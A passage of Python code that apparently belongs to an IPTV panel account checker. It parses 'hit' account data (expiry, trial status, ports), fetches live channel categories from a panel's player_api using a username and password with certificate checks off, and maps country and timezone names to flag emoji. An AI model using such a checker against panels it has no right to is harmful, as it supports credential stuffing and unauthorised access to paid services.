            timezone = timezone.replace("Pacific/Kiritimati", "🇰🇮Kiritimati[KI]")
            timezone = timezone.replace("Pacific/Kosrae", "🇫🇲Kosrae[FM]")
            timezone = timezone.replace("Pacific/Kwajalein", "🇲🇭Kwajalein[MH]")
            timezone = timezone.replace("Pacific/Majuro", "🇲🇭Majuro[MH]")
            timezone = timezone.replace("Pacific/Marquesas", "🇵🇫Marquesas Islands[PF]")
            timezone = timezone.replace("Pacific/Midway", "🇺🇸Midway[US]")
            timezone = timezone.replace("Pacific/Nauru", "🇳🇷Nauru[NR]")
            timezone = timezone.replace("Pacific/Niue", "🇳🇺Niue[NU]")
            timezone = timezone.replace("Pacific/Norfolk", "🇳🇫Norfolk Island[NF]")
            timezone = timezone.replace("Pacific/Noumea", "🇳🇨Noumea[NC]")
            timezone = timezone.replace("Pacific/Pago_Pago", "🇦🇸Pago Pago[AS]")
            timezone = timezone.replace("Pacific/Palau", "🇵🇼Palau[PW]")
            timezone = timezone.replace("Pacific/Pitcairn", "🇵🇳Pitcairn Islands[PN]")
            timezone = timezone.replace("Pacific/Pohnpei", "🇫🇲Pohnpei[FM]")
            timezone = timezone.replace("Pacific/Ponape", "🇫🇲Ponape[FM]")
            timezone = timezone.replace("Pacific/Port_Moresby", "🇵🇬Port Moresby[PG]")
            timezone = timezone.replace("Pacific/Rarotonga", "🇨🇰Rarotonga[CK]")
            timezone = timezone.replace("Pacific/Saipan", "🇲🇵Saipan[MP]")
            timezone = timezone.replace("Pacific/Samoa", "🇼🇸Samoa[WS]")
            timezone = timezone.replace("Pacific/Tahiti", "🇵🇫Tahiti[PF]")
            timezone = timezone.replace("Pacific/Tarawa", "🇰🇮Tarawa[KI]")
            timezone = timezone.replace("Pacific/Tongatapu", "🇹🇴Tongatapu[TO]")
            timezone = timezone.replace("Pacific/Truk", "🇫🇲Truk[FM]")
            timezone = timezone.replace("Pacific/Wake", "🇺🇸Wake[US]")
            timezone = timezone.replace("Pacific/Wallis", "🇼🇫Wallis[WF]")
            timezone = timezone.replace("Pacific/Yap", "🇫🇲Yap[FM]")
            timezone = timezone.replace("Poland", "🇵🇱Poland[PL]")
            timezone = timezone.replace("Portugal", "🇵🇹Portugal[PT]")
            timezone = timezone.replace("ROC", "🇹🇼Taiwan[TW]")
            timezone = timezone.replace("ROK", "🇰🇷South Korea[KR]")
            timezone = timezone.replace("Singapore", "🇸🇬Singapore[SG]")
            timezone = timezone.replace("UCT", "🌐UCT")
            timezone = timezone.replace("US/Alaska", "🇺🇸Alaska[US]")
            timezone = timezone.replace("US/Aleutian", "🇺🇸Aleutian[US]")
            timezone = timezone.replace("US/Arizona", "🇺🇸Arizona[US]")
            timezone = timezone.replace("US/Central", "🇺🇸Central[US]")
            timezone = timezone.replace("US/East-Indiana", "🇺🇸East Indiana[US]")
            timezone = timezone.replace("US/Eastern", "🇺🇸Eastern[US]")
            timezone = timezone.replace("US/Hawaii", "🇺🇸Hawaii[US]")
            timezone = timezone.replace("US/Indiana-Starke", "🇺🇸Indiana-Starke[US]")
            timezone = timezone.replace("US/Michigan", "🇺🇸Michigan[US]")
            timezone = timezone.replace("US/Mountain", "🇺🇸Mountain[US]")
            timezone = timezone.replace("US/Pacific", "🇺🇸Pacific[US]")
            timezone = timezone.replace("US/Samoa", "🇺🇸Samoa[US]")
            timezone = timezone.replace("UTC", "🌐UTC")
            timezone = timezone.replace("Universal", "🌐Universal")
            timezone = timezone.replace("W-SU", "W-SU")
            timezone = timezone.replace("WET", "WET")
            timezone = timezone.replace("Zulu", "Zulu")
            hitData.timezone = timezone
            realm = reponseMessage.split('url":')[1]
            realm = realm.split(",")[0]
            realm = realm.replace('"', "")
            hitData.real = realm
            port = reponseMessage.split('port":')[1]
            port = port.split(",")[0]
            port = port.replace('"', "")
            hitData.port = port
            outputFormats = reponseMessage.split('output_formats":')[1]
            outputFormats = outputFormats.split('"]}')[0]
            outputFormats = outputFormats.replace('","', ", ")
            outputFormats = outputFormats.replace('["', "")
            hitData.outputFormats = outputFormats
            timeInfo = reponseMessage.split('exp_date":')[1]
            timeInfo = timeInfo.split(",")[0]
            timeInfo = timeInfo.replace('"', "")
            if timeInfo == "null":
                hitData.caducidad = " #Uɴʟɪᴍɪᴛᴇᴅ "
            else:
                hitData.caducidad = datetime.datetime.fromtimestamp(int(timeInfo)).strftime("%d.%b.%Y %H:%M")
            trial = reponseMessage.split('is_trial":')[1]
            trial = trial.split(",")[0]
            trial = trial.replace('"', "")
            trial = trial.replace("0", "NO")
            trial = trial.replace("1", "YES")
            hitData.trial = trial
            httpsport = reponseMessage.split('https_port":')[1]
            httpsport = httpsport.split(",")[0]
            httpsport = httpsport.replace('"', "")
            hitData.httpsport = httpsport
            hprotocol = reponseMessage.split('server_protocol":')[1]
            hprotocol = hprotocol.split(",")[0]
            hprotocol = hprotocol.replace('"', "")
            hitData.hprotocol = hprotocol
            realport = reponseMessage.split('port":')[1]
            realport = realport.split(",")[0]
            realport = realport.replace('"', "")
            hitData.realport = realport
            rtmpport = reponseMessage.split('rtmp_port":')[1]
            rtmpport = rtmpport.split(",")[0]
            rtmpport = rtmpport.replace('"', "")
            hitData.rtmpport = rtmpport
        except Exception as err:
            print("Error when trying to find channels:", err)

    def extractChannelListM3U_FromUSER_PASS(self, panel, user, passw):
        url = "http://" + panel + "/player_api.php?username=" + user + "&password=" + passw + "&action=get_live_categories"
        print("Extracting channel list: ", url)
        try:
            ses = requests.session()
            res = ses.get(url, headers=(self.getHeaderM3U_withHOST(panel)), timeout=15, verify=False)
            return self.createChannelList(str(res.text))
        except:
            return "#𝐍𝐎_𝐈𝐍𝐅𝐎"

    def createChannelList(self, listlink):
        categori = ""
        country_record = "All|Afghanistan|Albania|Algeria|Andorra|Angola|Antigua and Barbuda|Argentina|Armenia|Australia|Austria|Azerbaijan|Bahamas|Bahrain|Bangladesh|Barbados|Belarus|Belgium|Belize|Benin|Bhutan|Bolivia|Bosnia and Herzegovina|Botswana|Brazil|Brunei|Bulgaria|Burkina Faso|Burundi|Cabo Verde|Cambodia|Cameroon|Canada|Central African Republic|Chad|Chile|China|Colombia|Comoros|Congo|Costa Rica|Côte d’Ivoire|Croatia|Cuba|Cyprus|Czech Republic|Denmark|Djibouti|Dominica|Dominican Republic|East Timor|Ecuador|Egypt|El Salvador|Equatorial Guinea|Eritrea|Estonia|Eswatini|Ethiopia|Fiji|Finland|France|Gabon|Gambia|Georgia|Germany|Ghana|Greece|Grenada|Guatemala|Guinea|Guinea-Bissau|Guyana|Haiti|Honduras|Hungary|Iceland|India|Indonesia|Iran|Iraq|Ireland|Israel|Italy|Jamaica|Japan|Jordan|Kazakhstan|Kenya|Kiribati|North Korea|South Korea|Kosovo|Kuwait|Kyrgyzstan|Laos|Latvia|Lebanon|Lesotho|Liberia|Libya|Liechtenstein|Lithuania|Luxembourg|Madagascar|Malawi|Malaysia|Maldives|Mali|Malta|Marshall Islands|Mauritania|Mauritius|Mexico|Federated States of Micronesia|Moldova|Monaco|Mongolia|Montenegro|Morocco|Mozambique|Burma|Myanmar|Namibia|Nauru|Nepal|Netherlands|New Zealand|Nicaragua|Niger|Nigeria|North Macedonia|Norway|Oman|Pakistan|Palau|Panama|Papua New Guinea|Paraguay|Peru|Philippines|Poland|Portugal|Qatar|Romania|Russia|Rwanda|Saint Kitts and Nevis|Saint Lucia|Saint Vincent and the Grenadines|Samoa|San Marino|Sao Tome and Principe|Saudi Arabia|Arab|Arabs|Senegal|Serbia|Seychelles|Sierra Leone|Singapore|Slovakia|Slovenia|Solomon Islands|Somalia|South Africa|Spain|Sri Lanka|Sudan|South Sudan|Suriname|Sweden|Switzerland|Syria|Taiwan|Tajikistan|Tanzania|Thailand|Togo|Tonga|Trinidad and Tobago|Tunisia|Turkey|Turkmenistan|Tuvalu|Uganda|Ukraine|United Arab Emirates|United Kingdom|United States|Uruguay|Uzbekistan|Vanuatu|Vatican City|Venezuela|Vietnam|Yemen|Zambia|Zimbabwe|Abkhazian|Afar|Afrikaans|Akan|Albanian|Amharic|Arabic|Aragonese|Armenian|Assamese|Avaric|Avestan|Aymara|Azerbaijani|Bambara|Bashkir|Basque|Belarusian|Bengali|Bislama|Bosnian|Breton|Bulgarian|Burmese|Canadien|Catalan|Chamorro|Chechen|Chichewa|Chinese|Slavonic|Chuvash|Cornish|Corsican|Cree|Croatian|Czech|Danish|Divehi|Dhivehi|Maldivian|Dutch|Dzongkha|English|Esperanto|Estonian|Ewe|Faroese|Fijian|Finnish|French|Western Frisian|Fulah|Gaelic|Galician|Ganda|Georgian|German|Greek|KalaallisutGreenlandic|Guarani|Gujarati|Haitian|Hausa|Hebrew|Herero|Hindi|Hiri Motu|Hungarian|Icelandic|Ido|Igbo|Indonesian|Interlingua|Interlingue|Inuktitut|Inupiaq|Irish|Italian|Japanese|Javanese|Kannada|Kanuri|Kashmiri|Kazakh|Khmer|Cambodian|Kikuyu|Gikuyu|Kinyarwanda|Kirghiz|Kyrgyz|Komi|Kongo|Korean|Kuanyama|Kwanyama|Kurdish|Lao|Latin|Latvian|Limburgan|Limburger|Limburgish|Lingala|Lithuanian|Luba-Katanga|Luxembourgish|Letzeburgesch|Macedonian|Malagasy|Malay|Malayalam|Maltese|Manx|Maori|Māori|Marathi|Marāṭhī|Marshallese|Mongolian|Nauru|Nauruan|Navajo|Navaho|North Ndebele|Northern Ndebele|South Ndebele|Southern Ndebele|Ndonga|Nepali|Norwegian|Sichuan Yi|Nuosu|Occitan|Ojibwa|Oriya|Oromo|Ossetian|Ossetic|Pali|Pashto|Pushto|Persian|Farsi|Polish|Portuguese|Punjabi|Panjabi|Quechua|Romanian|Moldavian|Moldovan|Romansh|Rundi|Russian|Northern Sami|Samoan|Sango|Sanskrit|Sardinian|Serbian|Shona|Sindhi|Sinhala|Sinhalese|Slovak|Slovenian|Somali|Southern Sotho|Spanish|Castilian|Sundanese|Swahili|Swati|Swedish|Tagalog|Filipino|Tahitian|Tajik|Tamil|Tatar|Telugu|Thai|Tibetan|Tigrinya|Tonga|Tongan|Tsonga|Tswana|Turkish|Turkmen|Twi|Uighur|Uyghur|Urdu|Uzbek|Venda|Vietnamese|Volapük|Walloon|Welsh|Wolof|Xhosa|Yiddish|Yoruba|Zhuang|Chuang|Zulu|canada|usa|uk|germany|vietnam|africa|india|latino|colombia|argentina|portugal|brazil|chile|peru|australia|italy|greek|caribbean|philippines|france|us/ca|tajikistan|uzbekistan|venezuela|spain|salvador|guatemala|honduras|panama|haiti|mexico|latvia|armenia|estonia|belarus|brasil|Algeria|malta|puerto rico|afghanistan|bulgaria|lithunia|ukraine|russia|indonesia|sri lanka|hongkong|south korea|Afghan|Sudan|Libya|china|malesyia|malaysia|kurdish|taiwan|azerbejian|Kannada|Persian|azerbaijan|arabic|arab| arabs|pakistan|georgia|kazachstan|Kazakhstan|australia|Bangla/Bengali|Urdu|Palestine|Telugu|Malayalam|Marathi|Oriya|Gujarat|Somali|thailand|iran|iraq|Sinhala|Hindi|Tamil|israel|Punjabi|switzerland|turkey|Egypt|finland|denmark|sweden|norway|hungary|czech republic|belgium|grecce|romania|netherland|spain|poland|albania|ireland|latin|netherlands|czech|belize|dominican|Lebanon|Gulf|Nepali|argentina|congo|Saudia Arabia|cameroon|kenya|ethiopia|jordan|kuwait|uae|Slovenia|cambodia|Syria|indonesia|bahrain|austria|canadian|filipino|Tunisia|Morocco|english|African|Australian|Brazilian|Danish|Dutch/Belgian|French|German|Indian|Italian|Nordic|Polish|Portuguese|Romanian|Spanish|Swedish|Canadian|UK&USA|Irish|turkish|chinese|Ukrainian|costa rica|dominicana|uruguay|paraguay|nicaragua|ecuador|cuba|united kingdom|united states|espanha|italia|swiss|scandinavia|balkan|can|eng|portugal/brazil|macedonia|espania|turkiye|rep dominicana|espana|deutchland|letzebuerg|Nederland|turquia|românia|POLAND|SPAIN|FRANCE|Bugarski|Hungarian |Deutschland |Crnogorski|Macedonia|Slovenia|Hrvatski|Srpski|Bosanski|SudAfrica|Kazakistan|Uruguay|Finlandia|Paraguay|Republica Domenicana|Bolivia|Honduras|Venezuela|Bosnia ed Erzegovina|Messico MX|Ecuador|Kuwait|Peruviani|Azerbaijan|Austria|Netherlands|Argentina|Kurdish|Serbija|Baltici|Slovacchia|Slovenia|Iran|Thailand|Armenia|Panama|Croatia|Nicaragua|Guatemala|Arabi|Albanesi|Portoghesi|Bangladesh|Qatar|Algeria|Marocco|Syria|Lithuania|Iraq|EX YU|Turkey|Grecia|Belgio|Africani|Cina|Bulgari|Palestina|Libia|Libanesi|Oman|Tunisia|Malesya|Montenegro|Jordan|Arabia Saudita|Macedoni|Sudan|Israele|VietNam|Ungheria|Ucraina|Afghanistan|Estonia|Brasiliani|Indonesia|Canadesi|Repubblica Ceca|Scandinavi|Giappone|South Korea|Caribbean|Egypt|Philippines|Bielorussia|Bahrain|United Arab Emirates|Giordania|Yemen|Haiti|Poland|Pakistani|Norvegesi|Malta|Svedesi|Colombia|Indiani|USA|Romania|Spagnoli|France|Germany|Italia|Ukraine|Elláda|Azərbaycan|Brasil|Mexicano|Afghanistan|Africa|Baanglaadesh|Paakistaan|Iran|Arabic|Bŭlgariya|Romaine|Rossiya|España|United States|Scandinavie|Hrvatska|Shqiperia/Kosova|Polska|Bosna|France|Belgium|Danmark|Other Countries|USA & Canada|United Kingdom|Turkey|Thailand|Switzerland|Sweden|Spain|South Asian Countries|Russia|Romania|Portugal|Poland|Norway|Netherlands|Macedonia|Latin America|Italy|Iraqi Kurdistan|Iran|Hungary|Greece|Germany|France|Finland|ex-Yu Countries|Denmark|Czech & Slovakia|Bulgaria|Belgium|Baltic States|Austria|Arab Countries|Albania|African Countries|Canada|ITALY|IRAN|PHILIPPINES|GUJRATI|BANGLADESH|KANNADA|INDIAN|AFGHANISTAN|ARABIC|PORTUGUESE|GERMAN|FRENCH|ALBANIA|AUSTRIA|SWITZERLAND|DEUTCHLAND|MAKEDONIJA|MONTENEGRO|SLOVENIJA|SRBIJA|BOSNA I HERCEGOVINA|HRVATSKA|Норвегия|Израел|ПОРТУГАЛИЯ|Унгария|СЪРБИЯ|ИСПАНИЯ|ФРАНЦИЯ|ПОЛСКИ|ТУРЦИЯ|ИТАЛИЯ|ГЕРМАНИЯ|БЪЛГАРИЯ|РУСКИ|Україна|Зарубіжні|Польща|Азербайджан|Грузія|Литва/Латвія/Естонія|Литва|Латвія|Естонія|Болгарія|Молдова|Арменія|Німеччина|Израиль|Чехія/Словаччина|Чехія|Словаччина|Англія|Portoquese|Afghanistan|Azerbaycan|Ελλάδα|Bulgars|Arab|België|Germania|Franta|United States|Spania|Italia|United Kingdom|Rusia|Danemarca|Ungaria|Bulgaria|Grecia|Turcia|EX-YU|Arabia|Finlanda|Elvetia|Norvegia|Canada|Albania|Austria|Portugalia|Cehia|Suedia|Polonia|Belgia|India|Brazilia|Latino|Tunisia|Pakistan|Romania|Türk|ExYu|Албания|Австрия|Азербайджан|Беларус|Белгия|Босна и Херцеговина|България|Ватикан|Великобритания|Германия|Грузия|Гърция|Дания|Ирландия|Исландия|Испания|Италия|Казахстан|Кипър|Латвия|Литва|Лихтенщайн|Люксембург|Македония|Малта|Молдова|Монако|Нидерландия|Норвегия|Полша|Португалия|Румъния|Русия|Сан Марино|Сърбия|Словакия|Словения|Съединени щати|Турция|Украйна|Унгария|Финландия|Франция|Хърватия|Чехия|Швейцария|РУСКИ|Україна|Зарубіжні|Польща|Азербайджан|Грузія|Литва/Латвія/Естонія|Литва|Латвія|Естонія|Болгарія|Молдова|Арменія|Німеччина|Израиль|Чехія/Словаччина|Чехія|Словаччина|Англія|Portoquese|Afghanistan|Azerbaycan|Ελλάδα|Bulgars|Arab|België|Germania|Franta"
        canal = ""
        categoria = ""
        if listlink.count('category_name":"') > 1:
            for i in listlink.split('category_name":"'):
                try:
                    canal = str(i.split('"')[0].encode("utf-8").decode("unicode-escape")).replace("\\/", "/")
                    canal = canal.replace("[", "")
                except:
                    canal = ""

                categoria = categoria + canal + "«⋆★⋆»"
                categoria = categoria.replace("{«⋆★⋆»", "")

        try:
            categoria = re.findall(country_record, (categoria.upper()), flags=(re.IGNORECASE))
            categoria1 = set(categoria)
            categoria2 = sorted(categoria1)
            listToStr = "  ".join([str(elem) for elem in categoria2])
            categoria = listToStr
            categoria = re.sub("\\bALBANIA\\b", "ALBANIA 🇦🇱", categoria)
            categoria = re.sub("\\bAFGHANISTAN\\b", "AFGHANISTAN 🇦🇫", categoria)
            categoria = re.sub("\\bALGERIA\\b", "ALGERIA 🇩🇿", categoria)
            categoria = re.sub("\\bAMERICAN SAMOA\\b", "AMERICAN SAMOA 🇦🇸", categoria)
            categoria = re.sub("\\bANDORRA\\b", "ANDORRA 🇦🇩", categoria)
            categoria = re.sub("\\bANGOLA\\b", "ANGOLA 🇦🇴", categoria)
            categoria = re.sub("\\bANGUILLA\\b", "ANGUILLA 🇦🇮", categoria)
            categoria = re.sub("\\bANTIGUA AND BARBUDA\\b", "ANTIGUA AND BARBUDA 🇦🇬", categoria)
            categoria = re.sub("\\bARGENTINA\\b", "ARGENTINA 🇦🇷", categoria)
            categoria = re.sub("\\bARMENIA\\b", "ARMENIA 🇦🇲", categoria)
            categoria = re.sub("\\bAUSTRALIA\\b", "AUSTRALIA 🇦🇺", categoria)
            categoria = re.sub("\\bARUBA\\b", "ARUBA 🇦🇼", categoria)
            categoria = re.sub("\\bAUSTRIA\\b", "AUSTRIA 🇦🇹", categoria)
            categoria = re.sub("\\bAZERBAIJAN\\b", "AZERBAIJAN 🇦🇿", categoria)
            categoria = re.sub("\\bBAHAMAS\\b", "BAHAMAS 🇧🇸", categoria)
            categoria = re.sub("\\bBAHRAIN\\b", "BAHRAIN 🇧🇾", categoria)
            categoria = re.sub("\\bBANGLADESH\\b", "BANGLADESH 🇧🇩", categoria)
            categoria = re.sub("\\bBARBADOS\\b", "BARBADOS 🇧🇧", categoria)
            categoria = re.sub("\\bBELARUS\\b", "BELARUS 🇧🇾", categoria)
            categoria = re.sub("\\bBELGIUM\\b", "BELGIUM 🇧🇪", categoria)
            categoria = re.sub("\\bBELIZE\\b", "BELIZE 🇧🇿", categoria)
            categoria = re.sub("\\bBENIN\\b", "BENIN 🇧🇯", categoria)
            categoria = re.sub("\\bBERMUDA\\b", "BERMUDA 🇧🇲", categoria)
            categoria = re.sub("\\bBHUTAN\\b", "BHUTAN 🇧🇹", categoria)
            categoria = re.sub("\\bBOLIVIA\\b", "BOLIVIA 🇧🇴", categoria)
            categoria = re.sub("\\bBONAIRE\\b", "BONAIRE 🇧🇶", categoria)
            categoria = re.sub("\\bBOSNIA AND HERZEGOVINA\\b", "BOSNIA AND HERZEGOVINA 🇧🇦", categoria)
            categoria = re.sub("\\bBOTSWANA\\b", "BOTSWANA 🇧🇼", categoria)
            categoria = re.sub("\\bBRAZIL\\b", "BRAZIL 🇧🇷", categoria)
            categoria = re.sub("\\bBRASIL\\b", "BRAZIL 🇧🇷", categoria)
            categoria = re.sub("\\bBRITISH INDIAN OCEAN TERRITORY\\b", "BRITISH INDIAN OCEAN TERRITORY 🇮🇴", categoria)
            categoria = re.sub("\\bBRITISH VIRGIN ISLANDS\\b", "BRITISH VIRGIN ISLANDS 🇻🇬", categoria)
            categoria = re.sub("\\bBRUNEI\\b", "BRUNEI 🇧🇳", categoria)
            categoria = re.sub("\\bBULGARIA\\b", "BULGARIA 🇧🇬", categoria)
            categoria = re.sub("\\bБЪЛГАРИЯ\\b", "БЪЛГАРИЯ 🇧🇬", categoria)
            categoria = re.sub("\\bBULGARS\\b", "BULGARIA 🇧🇬", categoria)
            categoria = re.sub("\\bBULGARI\\b", "BULGARIA 🇧🇬", categoria)
            categoria = re.sub("\\bBURKINA FASO\\b", "BURKINA FASO 🇧🇫", categoria)
            categoria = re.sub("\\bBURUNDI\\b", "BURUNDI 🇧🇮", categoria)
            categoria = re.sub("\\bCAMBODIA\\b", "CAMBODIA 🇰🇭", categoria)
            categoria = re.sub("\\bCAMEROON\\b", "CAMEROON 🇨🇲", categoria)
            categoria = re.sub("\\bCANADA\\b", "CANADA 🇨🇦", categoria)
            categoria = re.sub("\\bCAPE VERDE\\b", "CAPE VERDE 🇨🇻", categoria)
            categoria = re.sub("\\bCAYMAN ISLANDS\\b", "CAYMAN ISLANDS 🇰🇾", categoria)
            categoria = re.sub("\\bCENTRAL AFRICAN REPUBLIC\\b", "CENTRAL AFRICAN REPUBLIC 🇨🇫", categoria)
            categoria = re.sub("\\bCHAD\\b", "CHAD 🇹🇩", categoria)
            categoria = re.sub("\\bCHILE\\b", "CHILE 🇨🇱", categoria)
            categoria = re.sub("\\bCHINA\\b", "CHINA 🇨🇳", categoria)
            categoria = re.sub("\\bCHRISTMAS ISLAND\\b", "CHRISTMAS ISLAND 🇨🇽", categoria)
            categoria = re.sub("\\bCOCOS ISLANDS\\b", "COCOS ISLANDS 🇨🇨", categoria)
            categoria = re.sub("\\bCOLOMBIA\\b", "COLOMBIA 🇨🇴", categoria)
            categoria = re.sub("\\bCOMOROS\\b", "COMOROS 🇰🇲", categoria)
            categoria = re.sub("\\bCOOK ISLANDS\\b", "COOK ISLANDS 🇨🇰", categoria)
            categoria = re.sub("\\bCOSTA RICA\\b", "COSTA RICA 🇨🇷", categoria)
            categoria = re.sub("\\bCROATIA\\b", "CROATIA 🇭🇷", categoria)
            categoria = re.sub("\\bCUBA\\b", "CUBA 🇨🇺", categoria)
            categoria = re.sub("\\bCURACAO\\b", "CURACAO 🇨🇼", categoria)
            categoria = re.sub("\\bCYPRUS\\b", "CYPRUS 🇨🇾", categoria)
            categoria = categoria.replace("CÔTE D'IVOIRE", "CÔTE D'IVOIRE 🇨🇮")
            categoria = re.sub("\\bCZECH REPUBLIC\\b", "CZECH REPUBLIC 🇨🇿", categoria)
            categoria = re.sub("\\bDEMOCRATIC REPUBLIC OF THE CONGO\\b", "DEMOCRATIC REPUBLIC OF THE CONGO 🇨🇩", categoria)
            categoria = re.sub("\\bDENMARK\\b", "DENMARK 🇩🇰", categoria)
            categoria = re.sub("\\bDJIBOUTI\\b", "DJIBOUTI 🇩🇯", categoria)
            categoria = re.sub("\\bDOMINICA\\b", "DOMINICA 🇩🇲", categoria)
            categoria = re.sub("\\bDOMINICAN REPUBLIC\\b", "DOMINICAN REPUBLIC 🇩🇴", categoria)
            categoria = re.sub("\\bECUADOR\\b", "ECUADOR 🇪🇨", categoria)
            categoria = re.sub("\\bEGYPT\\b", "EGYPT 🇪🇬", categoria)
            categoria = re.sub("\\bEL SALVADOR\\b", "EL SALVADOR 🇸🇻", categoria)
            categoria = re.sub("\\bEQUATORIAL GUINEA\\b", "EQUATORIAL GUINEA 🇬🇶", categoria)
            categoria = re.sub("\\bERITREA\\b", "ERITREA 🇪🇷", categoria)
            categoria = re.sub("\\bESTONIA\\b", "ESTONIA 🇪🇪", categoria)
            categoria = re.sub("\\bETHIOPIA\\b", "ETHIOPIA 🇪🇹", categoria)
            categoria = re.sub("\\bFALKLAND\\b", "FALKLAND ISLANDS 🇫🇰", categoria)
            categoria = re.sub("\\bFAROE ISLANDS\\b", "FAROE ISLANDS 🇫🇴", categoria)
            categoria = re.sub("\\bFIJI\\b", "FIJI 🇫🇯", categoria)
            categoria = re.sub("\\bFINLAND\\b", "FINLAND 🇫🇮", categoria)
            categoria = re.sub("\\bFRANCE\\b", "FRANCE 🇫🇷", categoria)
            categoria = re.sub("\\bFRENCH GUIANA\\b", "FRENCH GUIANA 🇬🇫", categoria)
            categoria = re.sub("\\bFRENCH POLYNESIA\\b", "FRENCH POLYNESIA 🇵🇫", categoria)
            categoria = re.sub("\\bGABON\\b", "GABON 🇬🇦", categoria)
            categoria = re.sub("\\bGAMBIA\\b", "GAMBIA 🇬🇲", categoria)
            categoria = re.sub("\\bGEORGIA\\b", "GEORGIA 🇬🇪", categoria)
            categoria = re.sub("\\bGERMANY\\b", "GERMANY 🇩🇪", categoria)
            categoria = re.sub("\\bDEUTSCHLAND\\b", "DEUTSCHLAND 🇩🇪", categoria)
            categoria = re.sub("\\bGHANA\\b", "GHANA 🇬🇭", categoria)
            categoria = re.sub("\\bGIBRALTAR\\b", "GIBRALTAR 🇬🇮", categoria)
            categoria = re.sub("\\bGREECE\\b", "GREECE 🇬🇷", categoria)
            categoria = re.sub("\\bGREENLAND\\b", "GREENLAND 🇬🇱", categoria)
            categoria = re.sub("\\bGRENADA\\b", "GRENADA 🇬🇩", categoria)
            categoria = re.sub("\\bGUADELOUPE\\b", "GUADELOUPE 🇬🇵", categoria)
            categoria = re.sub("\\bGUAM\\b", "GUAM 🇬🇺", categoria)
            categoria = re.sub("\\bGUATEMALA\\b", "GUATEMALA 🇬🇹", categoria)
            categoria = re.sub("\\bGUERNSEY\\b", "GUERNSEY 🇬🇬", categoria)
            categoria = re.sub("\\bGUINEA\\b", "GUINEA 🇬🇳", categoria)
            categoria = re.sub("\\bGUINEA-BISSAU\\b", "GUINEA-BISSAU 🇬🇼", categoria)
            categoria = re.sub("\\bGUYANA\\b", "GUYANA 🇬🇾", categoria)
            categoria = re.sub("\\bHAITI\\b", "HAITI 🇭🇹", categoria)
            categoria = re.sub("\\bHONDURAS\\b", "HONDURAS 🇭🇳", categoria)
            categoria = re.sub("\\bHONG KONG\\b", "HONG KONG 🇭🇰", categoria)
            categoria = re.sub("\\bHUNGARY\\b", "HUNGARY 🇭🇺", categoria)
            categoria = re.sub("\\bHUNGARIAN\\b", "HUNGARIAN 🇭🇺", categoria)
            categoria = re.sub("\\bICELAND\\b", "ICELAND 🇮🇸", categoria)
            categoria = re.sub("\\bINDIA\\b", "INDIA 🇮🇳", categoria)
            categoria = re.sub("\\bINDONESIA\\b", "INDONESIA 🇮🇩", categoria)
            categoria = re.sub("\\bIRAN\\b", "IRAN 🇮🇷", categoria)
            categoria = re.sub("\\bIRAQ\\b", "IRAQ 🇮🇶", categoria)
            categoria = re.sub("\\bIRELAND\\b", "IRELAND 🇮🇪", categoria)
            categoria = re.sub("\\bISRAEL\\b", "ISRAEL 🇮🇱", categoria)
            categoria = re.sub("\\bITALY\\b", "ITALY 🇮🇹", categoria)
            categoria = re.sub("\\bITALIA\\b", "ITALIA 🇮🇹", categoria)
            categoria = re.sub("\\bISLE OF MAN\\b", "ISLE OF MAN 🇮🇲", categoria)
            categoria = re.sub("\\bJAMAICA\\b", "JAMAICA 🇯🇲", categoria)
            categoria = re.sub("\\bJAPAN\\b", "JAPAN 🇯🇵", categoria)
            categoria = re.sub("\\bJERSEY\\b", "JERSEY 🇯🇪", categoria)
            categoria = re.sub("\\bJORDAN\\b", "JORDAN 🇯🇴", categoria)
            categoria = re.sub("\\bKAZAKHSTAN\\b", "KAZAKHSTAN 🇰🇿", categoria)
            categoria = re.sub("\\bKENYA\\b", "KENYA 🇰🇪", categoria)
            categoria = re.sub("\\bKIRIBATI\\b", "KIRIBATI 🇰🇮", categoria)
            categoria = re.sub("\\bKOSOVO\\b", "KOSOVO 🇽🇰", categoria)
            categoria = re.sub("\\bKUWAIT\\b", "KUWAIT 🇰🇼", categoria)
            categoria = re.sub("\\bKYRGYZSTAN\\b", "KYRGYZSTAN 🇰🇬", categoria)
            categoria = re.sub("\\bLAOS\\b", "LAOS 🇱🇦", categoria)
            categoria = re.sub("\\bLATVIA\\b", "LATVIA 🇱🇻", categoria)
            categoria = re.sub("\\bLEBANON\\b", "LEBANON 🇱🇧", categoria)
            categoria = re.sub("\\bLESOTHO\\b", "LESOTHO 🇱🇸", categoria)
            categoria = re.sub("\\bLIBERIA\\b", "LIBERIA 🇱🇷", categoria)
            categoria = re.sub("\\bLIBYA\\b", "LIBYA 🇱🇾", categoria)
            categoria = re.sub("\\bLIECHTENSTEIN\\b", "LIECHTENSTEIN 🇱🇮", categoria)
            categoria = re.sub("\\bLITHUANIA\\b", "LITHUANIA 🇱🇹", categoria)
            categoria = re.sub("\\bLUXEMBOURG\\b", "LUXEMBOURG 🇱🇺", categoria)
            categoria = re.sub("\\bMACAU\\b", "MACAU 🇲🇴", categoria)
            categoria = re.sub("\\bNORTH MACEDONIA\\b", "NORTH MACEDONIA 🇲🇰", categoria)
            categoria = re.sub("\\bMACEDONIA\\b", "MACEDONIA 🇲🇰", categoria)
            categoria = re.sub("\\bMAKEDONIJA\\b", "MACEDONIA 🇲🇰", categoria)
            categoria = re.sub("\\bMADAGASCAR\\b", "MADAGASCAR 🇲🇬", categoria)
            categoria = re.sub("\\bMALAWI\\b", "MALAWI 🇲🇼", categoria)
            categoria = re.sub("\\bMALAYSIA\\b", "MALAYSIA 🇲🇾", categoria)
            categoria = re.sub("\\bMALDIVES\\b", "MALDIVES 🇲🇻", categoria)
            categoria = re.sub("\\bMALI\\b", "MALI 🇲🇱", categoria)
            categoria = re.sub("\\bMALTA\\b", "MALTA 🇲🇹", categoria)
            categoria = re.sub("\\bMARSHALL\\b", "MARSHALL ISLANDS 🇲🇭", categoria)
            categoria = re.sub("\\bMARTINIQUE\\b", "MARTINIQUE 🇲🇶", categoria)
            categoria = re.sub("\\bMAURITANIA\\b", "MAURITANIA 🇲🇷", categoria)
            categoria = re.sub("\\bMAURITIUS\\b", "MAURITIUS 🇲🇺", categoria)
            categoria = re.sub("\\bMAYOTTE\\b", "MAYOTTE 🇾🇹", categoria)
            categoria = re.sub("\\bMEXICO\\b", "MEXICO 🇲🇽", categoria)
            categoria = re.sub("\\bMICRONESIA\\b", "MICRONESIA 🇫🇲", categoria)
            categoria = re.sub("\\bMOLDOVA\\b", "MOLDOVA 🇲🇩", categoria)
            categoria = re.sub("\\bMONACO\\b", "MONACO 🇲🇨", categoria)
            categoria = re.sub("\\bMONGOLIA\\b", "MONGOLIA 🇲🇳", categoria)
